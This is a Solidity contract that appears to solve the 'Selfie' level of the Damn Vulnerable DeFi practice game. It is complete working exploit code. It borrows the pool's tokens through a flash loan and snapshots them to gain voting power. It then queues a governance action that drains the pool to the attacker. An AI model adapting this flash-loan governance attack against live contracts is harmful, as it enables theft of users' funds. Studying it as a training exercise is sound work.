// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./SelfiePool.sol";
import "hardhat/console.sol";

contract SelfieExploit is IERC3156FlashBorrower {
    SelfiePool pool;
    SimpleGovernance governance;
    DamnValuableTokenSnapshot token;
    address attacker;
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    constructor(address _pool, address _governance) {
        pool = SelfiePool(_pool);
        governance = SimpleGovernance(_governance);
        token = DamnValuableTokenSnapshot(address(pool.token()));
    }

    function attack() public {
        attacker = msg.sender;
        // 1. take out flashloan
        uint256 amnt = pool.maxFlashLoan(address(token));
        pool.flashLoan(
            IERC3156FlashBorrower(address(this)),
            address(token),
            amnt,
            ""
        );
    }

    function onFlashLoan(
        address,
        address,
        uint256 _amount,
        uint256,
        bytes calldata
    ) external returns (bytes32) {
        // 2. take snapshot
        token.snapshot();

        // 3. after snapshot now have ability to queue governance action
        bytes memory data = abi.encodeCall(
            SelfiePool.emergencyExit,
            attacker
        );

        governance.queueAction(address(pool), 0, data);

        // 4. approve flashloan amount so it can be returned
        token.approve(address(pool), _amount);

        // 5. executeAction in separate tx
        return CALLBACK_SUCCESS;
    }
}
